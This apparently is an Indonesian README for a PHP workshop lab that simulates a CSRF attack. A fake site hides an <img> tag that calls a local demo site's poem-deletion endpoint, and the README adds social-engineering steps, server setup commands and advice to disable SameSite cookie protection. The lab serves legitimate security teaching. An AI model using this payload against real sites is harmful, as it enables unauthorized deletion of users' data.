## Simulation 2 - Puisi Kita

Untuk melakukan serangan CSRF pada akun Mas Boy dan menghapus puisinya, dilakukan dengan membuat sebuah fake website yang didalamnya secara tidak terlihat terdapat sebuah &lt;img&gt; tag yang melakukan request ke end point penghapusan puisi. End point tersebut adalah:

```
GET /puisiku/?id=HASH&delete
```

Yang perlu dilakukan adalah melakukan social engineering agar Mas Boy mengunjungi fake website yang telah dibuat. Fake website tersebut mengandung tag &lt;img&gt; sebagai berikut:

```
<img src="http://localhost:8082/puisiku/?id=HASH&delete" style="visibility:hidden;">
```

Dimana `HASH` adalah ID dari puisi Mas Boy yaitu &quot;Nusantara Tercinta&quot;. Hal ini dapat diketahui dengan melakukan klik pada judul puisi &quot;Nusantara Tercinta&quot; atau langsung _view HTML source_ halaman depan.

## Menjalankan Simulasi

Download atau clone repository dari GitHub.

```
$ git clone git@github.com:rioastamal-examples/phpid-xss-csrf-simulation.git
```

Jalankan website target yaitu &quot;Puisi Kita&quot; pada port 8082.

```
$ cd phpid-xss-csrf-simulation
$ php -S 0.0.0.0:8082 \
-t phpid-xss-csrf-simulation/simulation-02/puisikita-website/public \
phpid-xss-csrf-simulation/simulation-02/puisikita-website/public/index.php
```

Pada terminal window lain jalankan Fake website untuk melakukan CSRF.

```
$ php -S 0.0.0.0:8083 \
-t phpid-xss-csrf-simulation/simulation-02/hacker-website/public \
phpid-xss-csrf-simulation/simulation-02/hacker-website/public/index.php
```

Untuk detil cara menjalankan serangan dapat dibaca pada slide presentasi.

Chrome versi &gt;= 80 dan Firefox versi &gt;= 75 memiliki policy SameSite Cookie yang tidak memungkinkan terjadinya serangnan CSRF yang digunakan pada simulasi ini. Untuk itu gunakan versi dibawahnya atau disable SameSite Cookie policy untuk mengetes. Pada chrome dapat menggunakan [chrome://flags/#same-site-by-default-cookies](chrome://flags/#same-site-by-default-cookies).